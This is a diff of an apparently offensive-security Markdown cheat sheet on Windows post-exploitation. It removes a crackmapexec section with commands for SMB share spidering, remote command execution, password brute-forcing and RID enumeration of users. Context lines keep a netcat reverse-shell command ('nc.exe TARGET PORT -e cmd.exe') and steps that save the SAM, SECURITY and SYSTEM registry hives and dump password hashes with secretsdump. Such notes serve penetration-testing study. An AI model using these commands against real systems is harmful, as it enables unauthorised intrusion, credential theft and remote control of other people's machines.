@@ -9,7 +9,6 @@
   - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
     - [Tampering with low users](#tampering-with-low-users)
     - [Dump hashs](#dump-hashs)
-    - [crackmapexec](#crackmapexec)
     - [Backdoor](#backdoor)
     - [Create/Modfiy Services](#createmodfiy-services)
     - [Schedule Tasks](#schedule-tasks)
@@ -290,6 +289,7 @@
 
 #### Connecting with nc
 - nc.exe TARGET PORT -e cmd.exe
+  
 ### Enumerate
 
 - **Check permisions**
@@ -333,16 +333,6 @@ reg.exe save hklm\security C:\path\to\save\security.save
 reg.exe save hklm\system C:\path\to\save\system.save
 
 python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL
-
-#### crackmapexec
-- crackmapexec smb <target-ip> -u username -p password -M spider_plus
-cat /tmp/cme_spider_plus/<target-ip>.json
-- crackmapexec smb $target -u Administrator -p 123456 -x COMMAND_TO_EXECUTE
-- crackmapexec smb $target -u users.txt -p pass.txt
-- crackmapexec smb $target -u user -p pass --rid-brute
-  - brute force SID - Security Identifier = find users
-
-- [crackmapexec](https://www.crackmapexec.wiki/)
 
 
 #### Backdoor
